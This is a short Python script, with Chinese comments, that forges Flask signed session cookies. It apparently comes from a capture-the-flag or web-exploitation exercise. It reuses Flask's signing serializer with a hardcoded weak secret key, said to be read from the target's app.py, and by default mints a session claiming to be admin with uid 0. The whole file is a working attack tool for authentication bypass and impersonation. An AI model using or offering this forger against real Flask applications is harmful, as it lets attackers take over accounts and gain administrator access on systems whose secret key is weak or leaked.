#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
伪造 Flask 的签名 session cookie。

这个文件就是 flask-unsign --sign 的等价实现：
调 Flask 自己的签名序列化器，把字典 dump 成 cookie。

依赖：pip install flask

用法：
    python3 flask_forge.py                          # 默认冒充 admin
    python3 flask_forge.py '{"name":"alice","uid":1}'
"""

import json
import sys

from flask import Flask
from flask.sessions import SecureCookieSessionInterface

SECRET = "123456"           # 从 app.py 读到的弱密钥


def forge(session_data: dict, secret: str = SECRET) -> str:
    app = Flask(__name__)
    app.secret_key = secret
    serializer = SecureCookieSessionInterface().get_signing_serializer(app)
    return serializer.dumps(session_data)


if __name__ == "__main__":
    if len(sys.argv) > 1:
        data = json.loads(sys.argv[1])
    else:
        data = {"name": "admin", "uid": 0}
    print(forge(data))
